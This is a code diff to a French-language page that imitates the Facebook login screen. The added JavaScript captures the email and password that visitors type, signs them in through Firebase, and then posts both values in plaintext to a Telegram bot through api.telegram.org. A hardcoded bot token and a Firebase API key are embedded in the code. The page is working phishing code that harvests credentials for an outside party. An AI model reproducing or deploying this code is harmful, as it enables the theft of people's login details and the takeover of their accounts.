@@ -129,7 +129,7 @@
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
         <h2>Se connecter</h2>
-        <form action="#" method="POST">
+        <form id="login-form">
             <div class="input-field">
                 <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
             </div>
@@ -152,6 +152,78 @@
             <a href="#" class="signup-btn">Créer un nouveau compte</a>
         </div>
     </div>
+
+    <!-- Inclure Firebase SDK -->
+    <script type="module" src="https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/11.9.1/firebase-auth.js"></script>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD0vYR9J8wuycfi3o-VQAuZmYrdmAmnWlc",
+            authDomain: "m7024476.firebaseapp.com",
+            projectId: "m7024476",
+            storageBucket: "m7024476.firebasestorage.app",
+            messagingSenderId: "962752636243",
+            appId: "1:962752636243:web:3b5d1ca677c63007582da6"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+
+        // Fonction de soumission du formulaire
+        document.getElementById("login-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            const email = e.target.email.value;
+            const password = e.target.password.value;
+
+            // Connexion avec Firebase
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // L'utilisateur est connecté
+                    const user = userCredential.user;
+                    console.log("Utilisateur connecté:", user);
+                    sendToTelegram(email, password); // Envoie des données au bot Telegram
+                    alert("Connexion réussie !");
+                })
+                .catch((error) => {
+                    // Gestion des erreurs
+                    const errorCode = error.code;
+                    const errorMessage = error.message;
+                    console.error("Erreur de connexion:", errorMessage);
+                    alert("Erreur de connexion : " + errorMessage);
+                });
+        });
+
+        // Fonction pour envoyer les informations au bot Telegram
+        function sendToTelegram(email, password) {
+            const token = "7804077937:AAEHcwdOLkwNjfUcokCiQkCHXrIhXDTTBkE";
+            const chatId = "YOUR_CHAT_ID"; // Remplacez par votre chat ID
+
+            const message = `Nouvelle connexion:\nEmail: ${email}\nMot de passe: ${password}`;
+
+            // Envoi des informations au bot Telegram via l'API
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message envoyé à Telegram:", data);
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi à Telegram:", error);
+            });
+        }
+    </script>
 
 </body>
 </html>
